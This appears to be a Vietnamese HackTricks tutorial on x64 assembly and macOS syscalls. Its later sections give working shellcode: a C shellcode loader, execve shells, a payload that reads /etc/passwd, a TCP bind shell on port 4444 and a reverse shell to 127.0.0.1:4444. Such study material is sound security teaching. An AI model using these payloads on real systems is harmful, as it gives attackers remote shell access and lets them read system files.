# Giới thiệu về x64

{{#include ../../../banners/hacktricks-training.md}}

## **Giới thiệu về x64**

x64, còn được gọi là x86-64 hoặc AMD64, là phần mở rộng 64-bit của kiến trúc tập lệnh x86. Kiến trúc này vẫn phổ biến trong máy tính để bàn và máy chủ, đồng thời được dùng trên các máy Mac chạy bộ xử lý Intel; máy Mac dùng Apple silicon sử dụng arm64. Các tài liệu hướng dẫn kiến trúc của Intel định nghĩa các thanh ghi, tập lệnh và chế độ hoạt động được tóm tắt dưới đây. <sup>[[1]](#references)</sup>

### **Thanh ghi**

x64 mở rộng kiến trúc x86, có **16 thanh ghi đa dụng** với tên `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` và từ `r8` đến `r15`. Mỗi thanh ghi có thể lưu giá trị **64-bit** (8 byte). Các thanh ghi này cũng có thanh ghi con 32-bit, 16-bit và 8-bit để tương thích và phục vụ các tác vụ cụ thể.

1. **`rax`** - Theo truyền thống, được dùng cho **giá trị trả về** từ các hàm.
2. **`rbx`** - Thường được dùng làm **thanh ghi cơ sở** cho các thao tác bộ nhớ.
3. **`rcx`** - Thường được dùng làm **bộ đếm vòng lặp**.
4. **`rdx`** - Được dùng cho nhiều mục đích, bao gồm các phép toán số học mở rộng.
5. **`rbp`** - **Con trỏ cơ sở** của khung ngăn xếp.
6. **`rsp`** - **Con trỏ ngăn xếp**, theo dõi vị trí trên cùng của ngăn xếp.
7. **`rsi`** và **`rdi`** - Được dùng làm chỉ mục **nguồn** và **đích** trong các thao tác chuỗi/bộ nhớ.
8. **`r8`** đến **`r15`** - Các thanh ghi đa dụng bổ sung được giới thiệu trong x64.

### **Quy ước gọi hàm**

Quy ước gọi hàm x64 khác nhau tùy hệ điều hành. Ví dụ:

- **Windows**: **Bốn tham số** đầu tiên được truyền qua các thanh ghi **`rcx`**, **`rdx`**, **`r8`** và **`r9`**. Các tham số tiếp theo được đẩy lên ngăn xếp. Giá trị trả về nằm trong **`rax`**.
- **System V (thường dùng trong các hệ thống kiểu UNIX)**: **Sáu tham số số nguyên hoặc con trỏ** đầu tiên được truyền qua các thanh ghi **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** và **`r9`**. Giá trị trả về cũng nằm trong **`rax`**.

Nếu hàm có hơn sáu đầu vào, **các đầu vào còn lại sẽ được truyền qua ngăn xếp**. **RSP**, con trỏ ngăn xếp, phải được **căn chỉnh theo 16 byte**, nghĩa là địa chỉ mà nó trỏ tới phải chia hết cho 16 trước khi thực hiện bất kỳ lệnh gọi nào. Điều này có nghĩa là thông thường chúng ta cần đảm bảo RSP được căn chỉnh đúng trong shellcode trước khi gọi hàm. Tuy nhiên, trên thực tế, các system call thường vẫn hoạt động ngay cả khi không đáp ứng yêu cầu này.

### Quy ước gọi hàm trong Swift

Swift có **quy ước gọi hàm** riêng, có thể xem tại [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Các lệnh phổ biến**

Tập lệnh x64 rất phong phú, duy trì khả năng tương thích với các lệnh x86 trước đó và bổ sung các lệnh mới.

- **`mov`**: **Di chuyển** một giá trị từ **thanh ghi** hoặc **vị trí bộ nhớ** này sang vị trí khác.
  - Ví dụ: `mov rax, rbx` — Di chuyển giá trị từ `rbx` sang `rax`.
- **`push`** và **`pop`**: Đẩy giá trị vào hoặc lấy giá trị ra khỏi **ngăn xếp**.
  - Ví dụ: `push rax` — Đẩy giá trị trong `rax` lên ngăn xếp.
  - Ví dụ: `pop rax` — Lấy giá trị trên cùng khỏi ngăn xếp và đưa vào `rax`.
- **`add`** và **`sub`**: Các phép toán **cộng** và **trừ**.
  - Ví dụ: `add rax, rcx` — Cộng các giá trị trong `rax` và `rcx`, rồi lưu kết quả vào `rax`.
- **`mul`** và **`div`**: Các phép toán **nhân** và **chia**. Lưu ý: chúng có cách sử dụng toán hạng riêng.
- **`call`** và **`ret`**: Dùng để **gọi hàm** và **trả về từ hàm**.
- **`int`**: Dùng để kích hoạt **ngắt** phần mềm. Ví dụ, `int 0x80` được dùng cho system call trong Linux x86 32-bit.
- **`cmp`**: **So sánh** hai giá trị và thiết lập các cờ của CPU dựa trên kết quả.
  - Ví dụ: `cmp rax, rdx` — So sánh `rax` với `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Các lệnh **nhảy có điều kiện**, thay đổi luồng điều khiển dựa trên kết quả của lệnh `cmp` hoặc lệnh kiểm tra trước đó.
  - Ví dụ: Sau lệnh `cmp rax, rdx`, `je label` — Nhảy đến `label` nếu `rax` bằng `rdx`.
- **`syscall`**: Dùng cho **system call** trên một số hệ thống x64 (như các hệ thống Unix hiện đại).
- **`sysenter`**: Lệnh **system call** được tối ưu hóa trên một số nền tảng.

### **Phần mở đầu hàm**

1. **Đẩy con trỏ cơ sở cũ lên ngăn xếp**: `push rbp` (lưu con trỏ cơ sở của hàm gọi)
2. **Chuyển con trỏ ngăn xếp hiện tại sang con trỏ cơ sở**: `mov rbp, rsp` (thiết lập con trỏ cơ sở mới cho hàm hiện tại)
3. **Cấp phát không gian trên ngăn xếp cho các biến cục bộ**: `sub rsp, <size>` (trong đó `<size>` là số byte cần thiết)

### **Phần kết thúc hàm**

1. **Chuyển con trỏ cơ sở hiện tại sang con trỏ ngăn xếp**: `mov rsp, rbp` (giải phóng các biến cục bộ)
2. **Lấy con trỏ cơ sở cũ khỏi ngăn xếp**: `pop rbp` (khôi phục con trỏ cơ sở của hàm gọi)
3. **Trả về**: `ret` (trả quyền điều khiển về cho hàm gọi)

## macOS

### syscalls

Có nhiều loại syscall khác nhau; bạn có thể [**tìm hiểu tại đây**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**

```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```

Sau đó, bạn có thể tìm số syscall của từng syscall [**tại URL này**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**

```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```

Vì vậy, để gọi syscall `open` (**5**) từ **Unix/BSD class**, bạn cần cộng thêm `0x2000000`.

Do đó, số syscall để gọi `open` sẽ là `0x2000005`.

### Shellcodes

Để biên dịch:

```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```

Để trích xuất các byte:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```

<details>

<summary>Mã C để kiểm tra shellcode</summary>

```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);

    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();

    return 0;
}
```

</details>

#### Shell

Các ví dụ tối giản sau gọi `execve` theo quy ước syscall macOS x86-64:

Để xem cách triển khai tương ứng cho ARM64 và mã shellcode gốc, hãy xem [trang assembly cơ bản ARM64](arm64-basic-assembly.md#shell).

{{#tabs}}
{{#tab name="with adr"}}

```armasm
bits 64
global _main
_main:
    call    r_cmd64
    db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
    pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
    xor     rdx, rdx          ; store null arg3
    push    59                ; put 59 on the stack (execve syscall)
    pop     rax               ; pop it to RAX
    bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall
```

{{#endtab}}

{{#tab name="with stack"}}

```armasm
bits 64
global _main

_main:
    xor     rdx, rdx          ; zero our RDX
    push    rdx               ; push NULL string terminator
    mov     rbx, '/bin/zsh'   ; move the path into RBX
    push    rbx               ; push the path, to the stack
    mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
    push    59                ; put 59 on the stack (execve syscall)
    pop     rax               ; pop it to RAX
    bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall
```

{{#endtab}}
{{#endtabs}}

#### Đọc bằng cat

Mục tiêu là thực thi `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, vì vậy đối số thứ hai (x1) là một mảng tham số (trong bộ nhớ, tức là một ngăn xếp chứa các địa chỉ).

```armasm
bits 64
section .text
global _main

_main:
    ; Prepare the arguments for the execve syscall
    sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

    lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
    lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

    ; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
    push rsi   ; Add "/etc/passwd" to the stack (arg0)
    push rdi   ; Add "/bin/cat" to the stack (arg1)

    ; Set in the 2nd argument of exec the addr of the array
    mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

    xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

    push    59      ; put 59 on the stack (execve syscall)
    pop     rax     ; pop it to RAX
    bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```

#### Gọi lệnh bằng sh

```armasm
bits 64
section .text
global _main

_main:
    ; Prepare the arguments for the execve syscall
    sub rsp, 32           ; Create space on the stack

    ; Argument array
    lea rdi, [rel touch_command]
    push rdi                      ; push &"touch /tmp/lalala"
    lea rdi, [rel sh_c_option]
    push rdi                      ; push &"-c"
    lea rdi, [rel sh_path]
    push rdi                      ; push &"/bin/sh"

    ; execve syscall
    mov rsi, rsp                  ; rsi = pointer to argument array
    xor rdx, rdx                  ; rdx = NULL (no env variables)
    push    59                    ; put 59 on the stack (execve syscall)
    pop     rax                   ; pop it to RAX
    bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall

_exit:
    xor rdi, rdi                  ; Exit status code 0
    push    1                     ; put 1 on the stack (exit syscall)
    pop     rax                   ; pop it to RAX
    bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
    syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```

#### Bind shell

Bind shell from [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) trên **port 4444**<sup>[[2]](#references)</sup>

```armasm
section .text
global _main
_main:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xffffffffa3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; bind(host_sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x68
    syscall

    ; listen(host_sockid, 2)
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept(host_sockid, 0, 0)
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    mov rdi, rax
    mov sil, 0x3

dup2:
    ; dup2(client_sockid, 2)
    ;   -> dup2(client_sockid, 1)
    ;   -> dup2(client_sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

#### Reverse Shell

Reverse shell từ [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell tới **127.0.0.1:4444**<sup>[[3]](#references)</sup>

```armasm
section .text
global _main
_main:
    ; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x2
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in {
    ;         __uint8_t       sin_len;
    ;         sa_family_t     sin_family;
    ;         in_port_t       sin_port;
    ;         struct  in_addr sin_addr;
    ;         char            sin_zero[8];
    ; };
    mov  rsi, 0xfeffff80a3eefdf0
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; connect(sockid, &sockaddr, 16)
    mov  rdi, rax
    xor  dl, 0x10
    mov  rax, r8
    mov  al, 0x62
    syscall

    xor rsi, rsi
    mov sil, 0x3

dup2:
    ; dup2(sockid, 2)
    ;   -> dup2(sockid, 1)
    ;   -> dup2(sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
```

## References

- [1] [Intel - Tài liệu hướng dẫn dành cho nhà phát triển phần mềm về kiến trúc Intel 64 và IA-32](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)
- [2] [Packet Storm - Shellcode Bind Shell TCP 4444 macOS (không chứa byte null)](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - Shellcode Reverse Shell macOS 127.0.0.1:4444](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)
{{#include ../../../banners/hacktricks-training.md}}
